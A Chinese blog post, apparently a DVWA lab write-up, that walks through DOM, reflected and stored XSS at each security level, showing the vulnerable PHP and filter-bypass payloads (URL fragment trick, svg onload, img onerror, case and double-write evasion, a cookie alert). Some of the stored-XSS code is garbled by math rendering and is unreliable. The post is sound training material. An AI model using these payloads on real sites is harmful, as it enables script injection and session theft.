@@ -1,0 +1,381 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DVWA之XSS | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="DVWA之XSS | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="XSS概念：通常指黑客通过HTML注入纂改了网页，插入恶意脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。
+XSS三种：
+反射型xss：只是简单地把用户输入的数据反射给浏览器，简单来说，黑客往往需要用户诱使用户点击一个恶意链接，才能攻..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              DVWA之XSS
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-03-30
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>XSS概念：通常指黑客通过HTML注入纂改了网页，插入恶意脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</p>
+<p>XSS三种：</p>
+<p>反射型xss：只是简单地把用户输入的数据反射给浏览器，简单来说，黑客往往需要用户诱使用户点击一个恶意链接，才能攻击成功。</p>
+<p>存储型XSS：将用户输入的数据存储在服务器端。用户访问了带有xss得页面代码后，产生安全问题。</p>
+<p>DOM　XSS：通过修改页面的DOM节点形成的XSS。</p>
+<p>XSS(DOM)<br>
+DOM型xss不会和后台服务器产生交互，而是通过浏览器的dom树解析。代码流向：前端–&gt;浏览器<br>
+1.low</p>
+<?php
+
+# No protections, anything goes
+
+?> 
+<p>没有任何代码过滤。</p>
+<p>payload：</p>
+<pre><code>?default=&lt;script&gt;alert('oh')&lt;/script&gt;
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617074204093.png" alt="" loading="lazy"><br>
+2.Medium<br>
+服务器核心代码<br>
+&lt;?php</p>
+<pre><code>// Is there any input?
+if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {
+$default = $_GET['default'];
+
+# Do not allow script tags
+if (stripos ($default, &quot;&lt;script&quot;) !== false){
+header (&quot;location: ?default=English&quot;);
+exit;}}?&gt;
+</code></pre>
+<p>这次后端做了限制，前端无变化。<br>
+不允许出现script标签，否则就将default的值设为默认的English，stripos还防止了大小写绕过<br>
+漏洞利用</p>
+<p>1.利用Url截断机制加#号<br>
+url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接<br>
+payload：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617090131311.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1617075611565.png" alt="" loading="lazy"></figure>
+<p>2.用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造连接<br>
+之前用过img的方法，这次使用svg的方法来完成。<br>
+/dvwa/vulnerabilities/xss_d/?default=<em></option></select>&lt;svg onload=alert(&quot;xss&quot;)&gt;</em><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617075713992.png" alt="" loading="lazy"></p>
+<pre><code>        3.High
+</code></pre>
+<p>服务器核心代码<br>
+&lt;?php</p>
+<pre><code>// Is there any input?
+if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {
+
+# White list the allowable languages
+switch ($_GET['default']) {
+case &quot;French&quot;:
+case &quot;English&quot;:
+case &quot;German&quot;:
+case &quot;Spanish&quot;:
+# ok
+break;
+default:
+header (&quot;location: ?default=English&quot;);
+exit;
+}
+}
+
+?&gt; 
+</code></pre>
+<p>这次后端做了限制，前端无变化。<br>
+在服务器后端判断，要求default的值必须为select选择菜单中的值default=只允许French，English，German，Spanish这几个字符串，否则会直接跳转到?default=English，这里继续用上面的#符号绕过即可，构造payload</p>
+<p>漏洞利用</p>
+<p>原理：由于form表单提交的数据需要经过js过滤，所以注释部分的JavaScript代码不会被传到服务器端（也就符合了白名单的要求）从而只在客户端显示。</p>
+<pre><code>/dvwa/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=xss onerror=alert(/xss/)&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://https://jinqipiaopiao.github.io//post-images/1617075777342.png" alt="" loading="lazy"></figure>
+<pre><code>    4.Impossible
+</code></pre>
+<p>服务器核心代码</p>
+<?php
+
+# Don't need to do anything, protction handled on the client side
+        没有任何东西，保护的代码在客户端里。
+
+?> 
+<p>后端无任何限制，尝试后居然成了如下图情况。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617075834074.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="3"><a href="https://imgchr.com/i/rpeGlQ"><img src="https://s3.ax1x.com/2020/12/08/rpeGlQ.png" alt="rpeGlQ.png" loading="lazy"></a></figure>
+<p>没有任何东西，保护的代码在客户端里。</p>
+<figure data-type="image" tabindex="4"><a href="https://imgchr.com/i/rpeL7t"><img src="https://s3.ax1x.com/2020/12/08/rpeL7t.md.png" alt="rpeL7t.md.png" loading="lazy"></a></figure>
+<p>查看源代码：</p>
+<p>English French Spanish German</p>
+<p>decodeURL(lang)，对lang进行URL解码。而decodeURL(lang)被(lang)替代了。发现我们输入的参数并没有进行URL解码，而我们输入的参数都是经过URL编码的，被直接赋予了option标签，所以不存在XSS漏洞。</p>
+<h4 id="xssreflected">XSS(Reflected)</h4>
+<p>反射型XSS攻击<br>
+又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击) 恶意代码并没有保存在目标网站，由浏览器解析脚本。</p>
+<h5 id="low">low</h5>
+<pre><code>&lt;?php
+
+header (“X-XSS-Protection: 0”);
+
+// Is there any input? if( array_key_exists( “name”, $_GET ) &amp;&amp; $_GET[ ‘name’ ] != NULL ) { // Feedback for end user echo ‘&lt;pre&gt;Hello ‘ . $_GET[ ‘name’ ] . ‘&lt;/pre&gt;’; }
+
+?&gt;
+</code></pre>
+<p>只对name参数判断了一下是否为空，没有进行任何过滤和检测，可直接进行输入。</p>
+<pre><code>&lt;script&gt;alert('hhh')&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="5"><a href="https://imgchr.com/i/rpnxyQ"><img src="https://s3.ax1x.com/2020/12/08/rpnxyQ.png" alt="rpnxyQ.png" loading="lazy"></a></figure>
+<p>一步到位。</p>
+<h5 id="medium">medium</h5>
+<pre><code>&lt;?php
+
+header (“X-XSS-Protection: 0”);
+
+// Is there any input? if( array_key_exists( “name”, $_GET ) &amp;&amp; $_GET[ ‘name’ ] != NULL ) { // Get input $name = str_replace( ‘
+// Feedback for end user
+echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; }
+?&gt;
+</code></pre>
+<p><strong>str_replace():</strong> 用其他字符代替字符串中的一些字符。</p>
+<p>medium级别的代码只是在low上增加了对<code>&lt;script&gt;</code>的过滤，我们可以直接大小写绕过（双写绕过）。</p>
+<pre><code>大小写混淆：
+
+输入&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;，成功弹框
+
+双写绕过：
+输入&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;，成功弹框
+
+输入其他标签：
+
+输入&lt;img src=1 οnerrοr=alert('xss')&gt;，成功弹窗
+</code></pre>
+<h5 id="high">high</h5>
+<pre><code>&lt;?php
+
+header (“X-XSS-Protection: 0”);
+
+// Is there any input? if( array_key_exists( “name”, $_GET ) &amp;&amp; $_GET[ ‘name’ ] != NULL ) { // Get input $name = preg_replace( ‘/&lt;(.)s(.)c(.)r(.)i(.)p(.)t/i’, ‘’, $_GET[ ‘name’ ] );
+
+// Feedback for end user
+echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; }
+?&gt;
+</code></pre>
+<p>**preg_replace()😗*执行一个正则表达式的搜索和替换。</p>
+<p>high级别代码使用了正则表达式直接把&lt;script过滤了，*表示一个或多个任意字符，i代表不区分大小写。所以大小写绕过和双写绕过不能用了，所以我们可以采用其他标签进行注入。<br>
+这使得双写绕过、大小写混淆绕过（正则表达式中，.*表示贪婪匹配，/i表示不区分大小写）不再有效，所以这里使用的是img标签</p>
+<p>这里让弹个cookie吧：</p>
+<pre><code>        &lt;img src=1 onerror=alert('document.cookie')&gt;
+</code></pre>
+<p>当图片显示错误时，执行alert()，就将我们要的cookie弹出来了。</p>
+<figure data-type="image" tabindex="6"><a href="https://imgchr.com/i/rplpcT"><img src="https://s3.ax1x.com/2020/12/08/rplpcT.png" alt="rplpcT.png" loading="lazy"></a></figure>
+<p>impossible</p>
+<p>`&lt;?php</p>
+<p>// Is there any input? if( array_key_exists( “name”, $_GET ) &amp;&amp; $_GET[ ‘name’ ] != NULL ) { // Check Anti-CSRF token checkToken( $_REQUEST[ ‘user_token’ ], $_SESSION[ ‘session_token’ ], ‘index.php’ );</p>
+<p>// Get input<br>
+$name = htmlspecialchars( $_GET[ 'name' ] );</p>
+<p>// Feedback for end user<br>
+echo &quot;<pre>Hello${name}</pre>&quot;; }<br>
+// Generate Anti-CSRF token generateSessionToken();</p>
+<p>?&gt;`</p>
+<p>htmlspecialchars(string)😗* 把预定义的字符 &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;&amp;&quot;, &quot;&quot;(双引号)&quot;, &quot;'(单引号)&quot; 转换为HTML实体，防止浏览器将其作为HTML元素。</p>
+<p>impossible级别的代码先判断name是否为空，不为空的话然后验证其token，来防范CSRF攻击。然后再用htmlspecialchars函数将name中的预定义字符转换成html实体，这样就防止了我们填入标签。</p>
+<p>XSS(Stored)</p>
+<p>low<br>
+`&lt;?php</p>
+<p>if( isset( $_POST[ ‘btnSign’ ] ) ) { // Get input $message = trim( $_POST[ ‘mtxMessage’ ] ); $name = trim( $_POST[ ‘txtName’ ] );</p>
+<p>// Sanitize message input</p>
+<p>$message =<br>
+stripslashes( $message );</p>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mo>=</mo><mo>(</mo><mo>(</mo><mi>i</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">message = 
+((isset(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object(<span class='katex-error' title='ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 10: GLOBALS[&quot;_̲__mysqli_ston&quot;]…'>GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string(</span>GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</p>
+<p>// Sanitize name input<br>
+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>=</mo><mo>(</mo><mo>(</mo><mi>i</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">name = 
+((isset(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object(<span class='katex-error' title='ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 10: GLOBALS[&quot;_̲__mysqli_ston&quot;]…'>GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string(</span>GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</p>
+<p>// Update database<br>
+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>I</mi><mi>N</mi><mi>S</mi><mi>E</mi><mi>R</mi><mi>T</mi><mi>I</mi><mi>N</mi><mi>T</mi><mi>O</mi><mi>g</mi><mi>u</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi>b</mi><mi>o</mi><mi>o</mi><mi>k</mi><mo>(</mo><mi>c</mi><mi>o</mi><mi>m</mi><mi>m</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo separator="true">,</mo><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mi>V</mi><mi>A</mi><mi>L</mi><mi>U</mi><mi>E</mi><mi>S</mi><msup><mo>(</mo><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">query  = 
+&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">&quot;</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">b</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">A</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>message', '$name' );&quot;;</p>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mo>=</mo><mi>m</mi><mi>y</mi><mi>s</mi><mi>q</mi><mi>l</mi><msub><mi>i</mi><mi>q</mi></msub><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">result = 
+mysqli_query(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mopen">(</span></span></span></span>GLOBALS[&quot;___mysqli_ston&quot;],  <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi><mo>)</mo><mi>o</mi><mi>r</mi><mi>d</mi><mi>i</mi><mi>e</mi><msup><mo>(</mo><mo mathvariant="normal">′</mo></msup><mo>&lt;</mo><mi>p</mi><mi>r</mi><mi>e</mi><msup><mo>&gt;</mo><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">.</mi><mo>(</mo><mo>(</mo><mi>i</mi><msub><mi>s</mi><mi>o</mi></msub><mi>b</mi><mi>j</mi><mi>e</mi><mi>c</mi><mi>t</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault">e</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">&gt;</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">.</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error(<span class='katex-error' title='ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 10: GLOBALS[&quot;_̲__mysqli_ston&quot;]…'>GLOBALS[&quot;___mysqli_ston&quot;]) : ((</span>___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );</p>
+<p>//mysql_close(); }<br>
+?&gt;`<br>
+555<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617093072729.png" alt="" loading="lazy"><br>
+<a href="https://imgchr.com/i/rp3Vl6"><img src="https://s3.ax1x.com/2020/12/08/rp3Vl6.png" alt="rp3Vl6.png" loading="lazy"></a><br>
+medium<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617093762773.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617093785920.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617101147858.png" alt="" loading="lazy"></p>
+<pre><code>    图一：
+</code></pre>
+<p><a href="https://imgchr.com/i/rp88UJ"><img src="https://s3.ax1x.com/2020/12/08/rp88UJ.png" alt="rp88UJ.png" loading="lazy"></a><br>
+图二：<br>
+<a href="https://imgchr.com/i/rp8wDO"><img src="https://s3.ax1x.com/2020/12/08/rp8wDO.png" alt="rp8wDO.png" loading="lazy"></a></p>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617093859560.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617093889979.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617093926166.png" alt="" loading="lazy"></p>
+<p>对name也进行了更加严格的过滤，无法进行name参数注入，还增加了Anti-CSRF token防止CSRF攻击，完全杜绝了XSS漏洞和CSRF漏洞。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#xssreflected">XSS(Reflected)</a>
+<ul>
+<li><a href="#low">low</a></li>
+<li><a href="#medium">medium</a></li>
+<li><a href="#high">high</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/dvwa-sql-injectionblindsql-mang-zhu/">
+              <h3 class="post-title">
+                DVWA之SQL Injection(Blind)(SQL盲注)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
